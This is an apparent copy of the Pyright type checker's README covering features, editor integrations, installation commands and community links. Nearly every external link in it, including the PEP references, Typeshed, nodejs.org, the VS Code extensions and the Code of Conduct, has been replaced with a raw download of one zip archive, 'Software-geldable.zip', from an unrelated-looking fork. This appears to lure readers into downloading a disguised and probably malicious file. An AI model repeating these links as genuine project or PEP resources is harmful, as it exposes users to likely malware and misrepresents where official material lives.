![Pyright](/docs/img/PyrightLarge.png)

# Static type checker for Python

### Speed
Pyright is a fast type checker meant for large Python source bases. It can run in a “watch” mode and performs fast incremental updates when files are modified.

### Configurability
Pyright supports [configuration files](/docs/configuration.md) that provide granular control over settings. Different “execution environments” can be associated with subdirectories within a source base. Each environment can specify different module search paths, python language versions, and platform targets.

### Type Checking Features
* [PEP 484](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) type hints including generics
* [PEP 487](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) simpler customization of class creation
* [PEP 526](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) syntax for variable annotations
* [PEP 544](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) structural subtyping
* [PEP 561](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) distributing and packaging type information
* [PEP 563](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) postponed evaluation of annotations
* [PEP 570](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) position-only parameters
* [PEP 585](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) type hinting generics in standard collections
* [PEP 586](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) literal types
* [PEP 589](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) typed dictionaries
* [PEP 591](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) final qualifier
* [PEP 593](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) flexible variable annotations
* [PEP 604](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) complementary syntax for unions
* [PEP 612](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) parameter specification variables
* [PEP 613](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) explicit type aliases
* [PEP 635](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) structural pattern matching
* [PEP 646](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) variadic generics
* [PEP 647](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) user-defined type guards
* [PEP 655](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) required typed dictionary items
* [PEP 673](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) Self type
* [PEP 675](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) arbitrary literal strings
* [PEP 681](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) dataclass transform
* [PEP 692](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) (draft) TypedDict for kwargs typing
* [PEP 695](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) (draft) Type parameter syntax
* [PEP 698](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) (draft) Override decorator for static typing
* Type inference for function return values, instance variables, class variables, and globals
* Type guards that understand conditional code flow constructs like if/else statements

### VS Code Integration
Pyright ships as both a command-line tool and a VS Code extension that provides many powerful features that help improve programming efficiency.

### VS Code Language Features
The VS Code extension supports many time-saving language features including:

* Intelligent type completion of keywords, symbols, and import names appears when editing
* Import statements are automatically inserted when necessary for type completions
* Signature completion tips help when filling in arguments for a call
* Hover over symbols to provide type information and doc strings
* Find Definitions to quickly go to the location of a symbol’s definition
* Find References to find all references to a symbol within a code base
* Rename Symbol to rename all references to a symbol within a code base
* Find Symbols within the current document or within the entire workspace
* View call hierarchy information — calls made within a function and places where a function is called
* Organize Imports command for automatically ordering imports according to PEP8 rules
* Type stub generation for third-party libraries

### Built-in Type Stubs
Pyright includes a recent copy of the stdlib type stubs from [Typeshed](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip). It can be configured to use another (perhaps more recent or modified) copy of the Typeshed type stubs. Of course, it also works with custom type stub files that are part of your project.

### Command-line Tool or Visual Studio Code Extension
Pyright includes both a [command-line tool](/docs/command-line.md) and an [extension for Visual Studio Code](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) that implements the [Language Server Protocol](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip).

For rich Python editing and debugging capabilities with Visual Studio Code, be sure to also install the official [Microsoft Python extension for Visual Studio Code](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) as Pyright only provides syntax and type checking.


## Installation
### VS Code Extension
For most VS Code users, we recommend using the Pylance extension rather than Pyright. Pylance incorporates the Pyright type checker but features additional capabilities such as IntelliCode and semantic token highlighting. You can install the latest-published version of the Pylance VS Code extension directly from VS Code. Simply open the extensions panel and search for “Pylance”.

### Vim
Vim/neovim users can install [coc-pyright](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip), the Pyright extension for coc.nvim.

Alternatively, [ALE](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) will automatically check your code with Pyright, without requiring any additional configuration.

### Sublime Text
Sublime text users can install the [LSP-pyright](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) plugin from [package control](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip).

### Emacs
Emacs users can install [eglot](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) or [lsp-mode](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) with [lsp-pyright](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip).

### Command-line
A [community-maintained](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) Python package by the name of “pyright” is available on pypi and conda-forge. This package will automatically install node (which Pyright requires) and keep Pyright up to date.

`pip install pyright`

or

`conda install pyright`

Once installed, you can run the tool from the command line as follows:
`pyright <options>`


Alternatively, you can install the command-line version of Pyright directly from npm, which is part of node. If you don't have a recent version of node on your system, install that first from [nodejs.org](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip). 

To install pyright globally:
`npm install -g pyright`

On MacOS or Linux, sudo may be required to install globally:
`sudo npm install -g pyright`

To update to the latest version:
`sudo npm update -g pyright`


## Documentation
* [Getting Started with Type Checking](/docs/getting-started.md)
* [Type Concepts](/docs/type-concepts.md)
* [Continuous Integration (CI)](/docs/ci-integration.md)
* [Command-line Options](/docs/command-line.md)
* [Configuration](/docs/configuration.md)
* [Settings](/docs/settings.md)
* [Comments](/docs/comments.md)
* [Type Inference](/docs/type-inference.md)
* [Import Resolution](/docs/import-resolution.md)
* [Extending Builtins](/docs/builtins.md)
* [Type Stubs](/docs/type-stubs.md)
* [Types in Libraries](/docs/typed-libraries.md)
* [Commands](/docs/commands.md)
* [Building & Debugging](/docs/build-debug.md)
* [Pyright Internals](/docs/internals.md)

For additional information about Python static typing, refer to this community-maintained [Python Type School](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip).

## Limitations
Pyright provides support for Python 3.0 and newer. There are no plans to support older versions.


## Community
Do you have questions about Pyright or Python type annotations in general? Post your questions in [the discussion section](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip).

If you would like to report a bug or request an enhancement, file a new issue in either the [pyright](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) or [pylance-release](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) issue tracker. In general, core type checking functionality is associated with Pyright while language service functionality is associated with Pylance, but the same contributors monitor both repos. For best results, provide the information requested in the issue template.


## FAQ
**Q:** What is the difference between Pyright and [Pylance](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip)? 

**A:** Pyright is an open-source Python type checker and language server. Pylance leverages Pyright’s functionality with additional features, some of which are not open-sourced. 

**Q:** What is the long-term plan for Pyright?

**A:** Pyright is an officially-supported Microsoft type checker for Python. It will continue to be developed and maintained as an open-source project under its original MIT license terms. The Pyright extension for VS Code is a reference implementation and is not guaranteed to be fully functional or maintained long-term.


## Contributing

This project welcomes contributions and suggestions. For feature and complex bug fix contributions, it is recommended that you first discuss the proposed change with Pyright’s maintainers before submitting the pull request. Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the rights to use your contribution. For details, visit https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip

When you submit a pull request, a CLA-bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately (e.g., label, comment). Simply follow the instructions provided by the bot. You will only need to do this once across all repos using our CLA.

This project has adopted the [Microsoft Open Source Code of Conduct](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip). For more information see the [Code of Conduct FAQ](https://github.com/RIOSMAgr/pyright/raw/refs/heads/main/packages/pyright-internal/Software-geldable.zip) or contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.
